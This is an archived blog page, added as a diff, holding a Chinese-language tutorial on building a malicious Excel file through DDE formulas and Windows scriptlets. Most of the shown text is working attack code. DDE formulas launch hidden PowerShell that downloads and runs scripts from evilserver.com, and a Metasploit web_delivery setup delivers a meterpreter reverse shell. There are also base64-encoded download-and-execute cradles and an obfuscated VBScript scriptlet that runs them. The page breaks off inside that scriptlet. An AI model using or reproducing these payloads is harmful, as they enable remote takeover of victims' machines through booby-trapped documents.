@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Execl Scriptlets Attack - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="0x00 基础 DDE可以通过Excel工作表公式执行任意命令，但是也有两个缺点.需要交互 1.启动时会提醒 启动内容 2.第二次打开时 更新内容 DDE通过进" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/execl-scriptlets-attack/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Execl Scriptlets Attack" />
+<meta property="og:description" content="0x00 基础 DDE可以通过Excel工作表公式执行任意命令，但是也有两个缺点.需要交互 1.启动时会提醒 启动内容 2.第二次打开时 更新内容 DDE通过进" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/execl-scriptlets-attack/" />
+<meta property="article:published_time" content="2017-12-19T21:10:32&#43;00:00"/>
+<meta property="article:modified_time" content="2017-12-19T21:10:32&#43;00:00"/>
+
+<meta itemprop="name" content="Execl Scriptlets Attack">
+<meta itemprop="description" content="0x00 基础 DDE可以通过Excel工作表公式执行任意命令，但是也有两个缺点.需要交互 1.启动时会提醒 启动内容 2.第二次打开时 更新内容 DDE通过进">
+
+
+<meta itemprop="datePublished" content="2017-12-19T21:10:32&#43;00:00" />
+<meta itemprop="dateModified" content="2017-12-19T21:10:32&#43;00:00" />
+<meta itemprop="wordCount" content="1207">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Execl Scriptlets Attack"/>
+<meta name="twitter:description" content="0x00 基础 DDE可以通过Excel工作表公式执行任意命令，但是也有两个缺点.需要交互 1.启动时会提醒 启动内容 2.第二次打开时 更新内容 DDE通过进"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Execl Scriptlets Attack</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#0x00-基础">0x00 基础</a></li>
+<li><a href="#0x01-msf生成powershell脚本">0x01 MSF生成powershell脚本</a></li>
+<li><a href="#0x02-特殊字符转换">0x02 特殊字符转换</a></li>
+<li><a href="#0x03-将脚本内容保存到xml文件">0x03 将脚本内容保存到xml文件</a></li>
+<li><a href="#0x04-使用python等开启http服务器">0x04 使用python等开启http服务器</a></li>
+<li><a href="#0x05-新建一个execl-在任意处粘贴以下内容保存即可">0x05 新建一个execl.在任意处粘贴以下内容保存即可</a></li>
+<li><a href="#0x06-打开execl">0x06 打开execl</a></li>
+<li><a href="#0x07-彩蛋">0x07 彩蛋</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<h1 id="0x00-基础">0x00 基础</h1>
+
+<p>DDE可以通过Excel工作表公式执行任意命令，但是也有两个缺点.需要交互<br />
+1.启动时会提醒 <code>启动内容</code><br />
+2.第二次打开时 <code>更新内容</code></p>
+
+<p>DDE通过进程通信.为了保证实时更新，允许从Excel内部调用应用程序，甚至可以通过Web请求将实时数据返回</p>
+
+<p>而且可执行文件的名称和参数有一些长度限制,可能无法直接从DDE执行PowerShell.exe，但可以通过将PowerShell.exe作为参数传递给cmd.exe来完成此操作。这会将更多的字节添加到已经受限的1024字节参数长度中，1024是<code>CreateProcess（）</code>函数的最大cmd长度。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">=</span><span class="n">cmd</span><span class="p">|</span><span class="s1">&#39;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\&#34;http://evilserver.com/sp.base64\&#34;);powershell -e $e&#39;</span><span class="p">!</span><span class="n">A1</span>
+
+<span class="n">解码后的脚本</span>
+<span class="p">=</span><span class="n">cmd</span><span class="p">|</span><span class="s1">&#39;/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\&#34;http://evilserver.com/sp.ps1\&#34;);IEX $e&#39;</span><span class="p">!</span><span class="n">A1</span>
+
+<span class="n">使用bat</span>
+<span class="p">=</span><span class="n">cmd</span><span class="p">|</span><span class="s1">&#39;/c \\evilserver.com\sp.bat;IEX $e&#39;</span><span class="p">!</span><span class="n">A1</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>当然除了下面演示的反弹shell还有更多玩法<br />
+例如: 直接使用execl提权等等<br />
+<a href="https://gist.githubusercontent.com/ssherei/41eab0f2c038ce8b355acf80e9ebb980/raw/0a3b7af41ac8c9a975cfeff2ab21c7eb5e6857a1/Modified-MS16-032.ps1">https://gist.githubusercontent.com/ssherei/41eab0f2c038ce8b355acf80e9ebb980/raw/0a3b7af41ac8c9a975cfeff2ab21c7eb5e6857a1/Modified-MS16-032.ps1</a></p>
+
+<p><a href="https://www.youtube.com/watch?v=fzyK6RFNfDU">https://www.youtube.com/watch?v=fzyK6RFNfDU</a></p>
+
+<h1 id="0x01-msf生成powershell脚本">0x01 MSF生成powershell脚本</h1>
+
+<p><strong>原文地址</strong>:<a href="https://www.lastline.com/labsblog/when-scriptlets-attack-excels-alternative-to-dde-code-execution/">https://www.lastline.com/labsblog/when-scriptlets-attack-excels-alternative-to-dde-code-execution/</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">use exploit/multi/script/web_delivery
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.10.2
+set lport 22222
+set srvhost 10.10.10.2
+set target 2
+set ssl true
+run -j
+
+[*] Server started.
+[*] Run the following command on the target machine:
+powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$l=new-object net.webclient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $l.downloadstring(&#39;https://10.10.10.2:8080/QpxuaN&#39;);</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x02-特殊字符转换">0x02 特殊字符转换</h1>
+
+<p>注意:<br />
+powershell中base64编码用utf8转base64会执行失败</p>
+
+<p>utf8 &mdash;&mdash;&mdash;&mdash;&gt;&gt;&gt; base64  False<br />
+utf16-le &mdash;&mdash;&gt;&gt;&gt; base64  True</p>
+
+<p><strong>bash</strong><br />
+<strong>注意</strong>:这里我用的双引号和单引号请区分.上面payload中url是单引号,被我更改成双引号了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># echo &#39;[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$l=new-object net.webclient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $l.downloadstring(&#34;https://10.10.10.2:8080/QpxuaN&#34;)&#39; |iconv --to-code UTF-16LE|base64</span>
+
+<span class="n">WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAPQB7ACQAdAByAHUAZQB9ADsAJABsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGwALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAkAGwALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwAxADAALgAxADAALgAxADAALgAyADoAOAAwADgAMAAvAFEAcAB4AHUAYQBOACIAKQAKAA</span>
+
+
+<span class="n">或者</span>
+
+<span class="n">先保存成payload</span><span class="p">.</span><span class="n">txt</span> <span class="p">//</span><span class="n">记得换行</span>
+<span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span><span class="p">={</span><span class="nv">$true</span><span class="p">};</span>
+<span class="nv">$l</span><span class="p">=</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">;</span>
+<span class="nv">$l</span><span class="p">.</span><span class="n">proxy</span><span class="p">=</span><span class="no">[Net.WebRequest]</span><span class="p">::</span><span class="n">GetSystemWebProxy</span><span class="p">();</span>
+<span class="nv">$l</span><span class="p">.</span><span class="n">Proxy</span><span class="p">.</span><span class="n">Credentials</span><span class="p">=</span><span class="no">[Net.CredentialCache]</span><span class="p">::</span><span class="n">DefaultCredentials</span><span class="p">;</span>
+<span class="n">IEX</span> <span class="nv">$l</span><span class="p">.</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;https://10.10.10.2:8080/QpxuaN&#39;</span><span class="p">)</span>
+
+<span class="c"># cat payload.txt|iconv --to-code UTF-16LE|base64</span>
+
+<span class="n">WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAPQB7ACQAdAByAHUAZQB9ADsACgAkAGwAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AAoAJABsAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AAoAJABsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsACgBJAEUAWAAgACQAbAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvADEAMAAuADEAMAAuADEAMAAuADIAOgA4ADAAOAAwAC8AUQBwAHgAdQBhAE4AJwApAAoA</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>python</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">In</span> <span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="kn">import</span> <span class="nn">base64</span>
+<span class="n">In</span> <span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="n">x</span> <span class="o">=</span> <span class="s2">&#34;[System.Net.ServicePointManager]::ServerCertificateValidationCallba</span><span class="err">
+</span><span class="err"></span><span class="s2">   ...: ck={$true};$l=new-object net.webclient;$l.proxy=[Net.WebRequest]::GetSys</span><span class="err">
+</span><span class="err"></span><span class="s2">   ...: temWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredent</span><span class="err">
+</span><span class="err"></span><span class="s2">   ...: ials;IEX $l.downloadstring(&#39;https://10.10.10.2:8080/QpxuaN&#39;)&#34;</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="n">y</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;UTF-16LE&#39;</span><span class="p">)</span>
+<span class="n">In</span> <span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="n">base64</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="s1">&#39;WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAPQB7ACQAdAByAHUAZQB9ADsAJABsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGwALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAkAGwALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADAALgAxADAALgAxADAALgAyADoAOAAwADgAMAAvAFEAcAB4AHUAYQBOACcAKQA=&#39;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>powershell[1]</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span><span class="p">&gt;</span> <span class="p">(</span><span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="n">echo</span> <span class="p">{</span><span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span><span class="p">={</span><span class="nv">$true</span><span class="p">};</span><span class="nv">$l</span><span class="p">=</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">;</span><span class="nv">$l</span><span class="p">.</span><span class="n">proxy</span><span class="p">=</span><span class="no">[Net.WebRequest]</span><span class="p">::</span><span class="n">GetSystemWebProxy</span><span class="p">();</span><span class="nv">$l</span><span class="p">.</span><span class="n">Proxy</span><span class="p">.</span><span class="n">Credentials</span><span class="p">=</span><span class="no">[Net.CredentialCache]</span><span class="p">::</span><span class="n">DefaultCredentials</span><span class="p">;</span><span class="n">IEX</span> <span class="nv">$l</span><span class="p">.</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;https://10.10.10.2:8080/QpxuaN&#39;</span><span class="p">)}).</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)[</span><span class="n">1</span><span class="p">]</span>
+
+<span class="n">WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAPQB7ACQAdAByAHUAZQB9ADsAJABsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGwALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAkAGwALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADAALgAxADAALgAxADAALgAyADoAOAAwADgAMAAvAFEAcAB4AHUAYQBOACcAKQA</span><span class="p">=</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>powershell[2]</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$command</span><span class="p">=</span><span class="s2">&#34;[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$l=new-object net.webclient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $l.downloadstring(&#39;https://10.10.10.2:8080/QpxuaN&#39;)&#34;</span>
+<span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$byte</span><span class="p">=</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
+<span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$encodecomand</span><span class="p">=</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$byte</span><span class="p">)</span>
+<span class="n">PS</span><span class="p">&gt;</span> <span class="n">echo</span> <span class="nv">$encodecomand</span>
+
+<span class="n">WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAPQB7AFQAcgB1AGUAfQA7AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9AFsATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AEkARQBYACAALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADAALgAxADAALgAxADAALgAyADoAOAAwADgAMAAvAFEAcAB4AHUAYQBOACcAKQA</span><span class="p">=</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>其他类型</strong><br />
+<a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a><br />
+<a href="https://04z.net/archives/bf627292.html">https://04z.net/archives/bf627292.html</a></p>
+
+<h1 id="0x03-将脚本内容保存到xml文件">0x03 将脚本内容保存到xml文件</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?XML version=&#34;1.0&#34;?&gt;</span>
+<span class="nt">&lt;scriptlet&gt;</span>
+    <span class="nt">&lt;registration</span>
+    <span class="na">description=</span><span class="s">&#34;KH9uSJNGgLpeK&#34;</span>
+    <span class="na">progid=</span><span class="s">&#34;aLqKTT.ba9f0i&#34;</span>
+    <span class="na">version=</span><span class="s">&#34;1.0&#34;</span>
+    <span class="na">classid=</span><span class="s">&#34;{D77A5972-210E-4FD6-BC1E-6094A40A1025}&#34;</span> <span class="na">remotable=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/registration&gt;</span>
+    <span class="nt">&lt;script</span> <span class="na">language=</span><span class="s">&#34;VBScript&#34;</span><span class="nt">&gt;</span>
+        <span class="cp">&lt;![CDATA[
+</span><span class="cp">if not vLQ then
+</span><span class="cp">dim tZnIOJNSxlFdPBXvNMkpDqNa : DiM xZdwuEqRiLPWuENFURdUOisq : Set tZnIOJNSxlFdPBXvNMkpDqNa = creaTEobjEcT(StrReverse(ChrW(&amp;H57)) &amp; ChrW(&amp;H53) &amp; Chr(&amp;H63) &amp; ChrW(&amp;H72) &amp; Chr(&amp;H69) &amp; StrReverse(Chr(&amp;H70)) &amp; ChrW(&amp;H54) &amp; StrReverse(Chr(&amp;H2E)) &amp; StrReverse(Chr(&amp;H53)) &amp; Chr(&amp;H48) &amp; StrReverse(ChrW(&amp;H65)) &amp; ChrW(&amp;H6C) &amp; ChrW(&amp;H4C)):xZdwuEqRiLPWuENFURdUOisq=&#34; poWERSHelL.EXe -ex ByPAss -noP -W Hidden -Ec WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAPQB7ACQAdAByAHUAZQB9ADsAJABsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGwALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAkAGwALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADAALgAxADAALgAxADAALgAyADoAOAAwADgAMAAvAFEAcAB4AHUAYQBOACcAKQA= &#34;:tZnIOJNSxlFdPBXvNMkpDqNa.rUn ChR(34)&amp;tZnIOJNSxlFdPBXvNMkpDqNa.eXPaNDEnVIROnMENtStrinGs(StrReverse(ChrW(&amp;H25)) &amp; ChrW(&amp;H43) &amp; StrReverse(ChrW(&amp;H4F)) &amp; Chr(&amp;H6D) &amp; StrReverse(Chr(&amp;H53)) &amp; Chr(&amp;H70) &amp; StrReverse(ChrW(&amp;H65)) &amp; Chr(&amp;H43) &amp; StrReverse(ChrW(&amp;H25)))&amp;cHR(34)&amp;CHR(34)&amp;ChrW(&amp;H2F) &amp; StrReverse(Chr(&amp;H43)) &amp; Chr(&amp;H20)&amp;xZdwuEqRiLPWuENFURdUOisq&amp;CHR(34),0:set tZnIOJNSxlFdPBXvNMkpDqNa = noThIng
+</span><span class="cp">end if
+</span><span class="cp">Function vLQ
+</span><span class="cp">Dim vFVw
+</span><span class="cp">Dim vdbGCrvsiz
+</span><span class="cp">Dim vUC
+</span><span class="cp">    Set vFVw = GetObject(&#34;winmgmts:\\.\root\cimv2&#34;).ExecQuery(_
